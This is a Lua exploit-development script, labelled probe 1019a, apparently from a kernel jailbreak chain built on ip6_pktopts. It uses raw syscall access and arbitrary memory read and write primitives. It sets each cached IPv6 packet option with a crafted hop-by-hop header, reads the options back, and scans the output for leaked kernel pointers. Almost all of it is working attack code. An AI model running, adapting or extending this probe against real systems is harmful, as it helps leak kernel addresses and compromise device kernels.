-- CRASH_CLASS: LOW
-- PROBE 1019a: the other cached pktopts options, read back.
--
-- The loader's kread builds on ip6_pktopts, which caches IPV6_RTHDR, IPV6_HOPOPTS,
-- IPV6_DSTOPTS and the 2292 legacy aliases. 1015a reads PKTINFO back; these are the
-- options that can carry a variable-length buffer, so a readback may copy the cached
-- structure (with its kernel pointer at +0x10) instead of the option bytes.

print("=== PROBE 1019a: PKTOPTS OPTIONS ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function as_addr(x)
    local m = tostring(x):match("0x(%x+)")
    if m then return tonumber(m,16) end
    return to_num(x)
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rq(a) local o,v=pcall(function() return memory.read_qword(uint64(a)) end) if o then return tostring(v) end return "?" end

local IPPROTO_IPV6 = 41
local OPT = {
    {22, "HOPOPTS"},
    {23, "DSTOPTS"},
    {24, "RTHDR"},
    {57, "PKTOPTIONS"},
    {20, "2292HOPOPTS"},
    {21, "2292DSTOPTS"},
    {25, "2292RTHDR"},
}
local sc_sock = mk(97); local sc_set = mk(105); local sc_get = mk(118); local sc_close = mk(6)

local opt = memory.alloc(0x80); local opa = as_addr(opt)
local out = memory.alloc(0x400); local oa = as_addr(out)
local lenp = memory.alloc(8);    local la = as_addr(lenp)
for o=0,0x78,8 do wq(opa+o,0) end
-- a hop-by-hop header: next=59 (no next), len=0, pad1 x6
wq(opa, 0x0000013B)   -- bytes: 3b 01 00 00 00 00 00 00
local function scrub() for o=0,0x3F8,8 do wq(oa+o,0x4141414141414141) end wq(la,0x400) end

local fd = to_num(select(2, pcall(function() return sc_sock(uint64(28),uint64(2),uint64(0)) end)))
print(string.format("[0] fd=%d", fd))
if fd > 0 then
    for _,o in ipairs(OPT) do
        local ok, rv = pcall(function() return sc_set(uint64(fd),uint64(IPPROTO_IPV6),uint64(o[1]),uint64(opa),uint64(8)) end)
        local s = ok and to_num(rv) or -99
        if not ok or s ~= 0 then
            -- set refused: a readback would measure an empty option cache, not the option
            print(string.format("[%-10s] set=%d, readback skipped (unmeasured)", o[2], s))
        else
        scrub()
        local ok2, rv2 = pcall(function() return sc_get(uint64(fd),uint64(IPPROTO_IPV6),uint64(o[1]),uint64(oa),uint64(la)) end)
        local g = ok2 and to_num(rv2) or -99
        local hits = 0
        for k=0,0x3F8,8 do
            local sv = rq(oa+k)
            local hi = sv:match("^0x(%x+)")
            if hi and #hi >= 9 then
                local top = tonumber(hi:sub(1,#hi-8),16)
                if top and top >= 0xFFFF8000 then hits = hits + 1 end
            end
        end
        print(string.format("[%-10s] set=%d get=%d len=%s hits=%d %s %s", o[2], s, g, rq(la), hits, rq(oa), rq(oa+8)))
        end
    end
    pcall(function() return sc_close(uint64(fd)) end)
end
print(string.format("[Z] alive pid=%u", to_num(mk(20)())))
print("=== COMPLETE ===")
